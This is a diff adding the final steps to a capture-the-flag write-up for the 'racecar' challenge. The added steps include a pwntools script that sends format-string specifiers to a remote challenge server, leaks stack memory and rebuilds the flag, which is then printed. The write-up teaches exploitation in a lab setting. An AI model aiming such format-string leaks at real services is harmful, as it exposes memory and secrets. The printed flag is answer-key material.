@@ -151,10 +151,95 @@ Did you know that racecar spelled backwards is racecar? Well, now that you know 
 ![image](https://user-images.githubusercontent.com/70703371/207580928-b1531015-450d-47cd-b451-e0952b13ca67.png)
 
 
-> CONTINUE -> %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p
+> ETC..
 
-%12$s %13$s %14$s %15$s %16$s
+22. To simply automate this, i made a python script to solve this challenge:
 
-![image](https://user-images.githubusercontent.com/70703371/207581109-49539cf6-482b-48ff-8820-0333a3f3f1d5.png)
+> THE SCRIPT
+
+```py
+from pwn import *
+import os
+
+'''
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+#gdbscript = '''
+#init-pwndbg
+#continue
+'''.format(**locals())
+exe = '.racecar'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+'''
+
+os.system('clear')
+context.log_level = 'debug' 
+payload = ""
+
+for i in range(12, 13):
+    payload += "%" + str(i) + "$p " # sh.sendline('%' + str(i) + '$s')
+
+sh = remote('157.245.41.35', 30606)
+sh.recvuntil(": ")
+sh.sendline(b'Nicolas')
+sh.recvuntil(": ")
+sh.sendline(b'Nic')
+sh.recvuntil("> ")
+sh.sendline(b'2')
+sh.recvuntil("> ")
+sh.sendline(b'1')
+sh.recvuntil("> ")
+sh.sendline(b'2')
+sh.recvuntil("> ")
+sh.sendline(payload)
+sh.recv()
+result = sh.recv()
+print(result)
+
+
+output = (result.decode("utf-8").split("m\n"))[1]
+output = output.split()
+
+flag = ""
+for items in output:
+    flag += p32(int(items, base = 16)).decode("utf-8") #base 16 -> hex , then decode it
+
+print(flag)
+```
+
+23. Try to input 13 as the end offset of the flag.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/207584221-f3856834-bfcb-4fb5-9a2a-d5906b2ca9d1.png)
+
+
+24. Got the prefix only.
+25. So increment the second parameter of the loop until i got the complete flag.
+26. Turns out, i got the flag when the second parameter value is 223.
+
+> RESULT
+
+
+![image](https://user-images.githubusercontent.com/70703371/207584718-d45605b4-30ed-4bcd-a63d-0af51c2dbe9e.png)
+
+
+27. Finally, we got the flag!
+
+
+## FLAG
+
+```
+HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}
+```
+
 
 
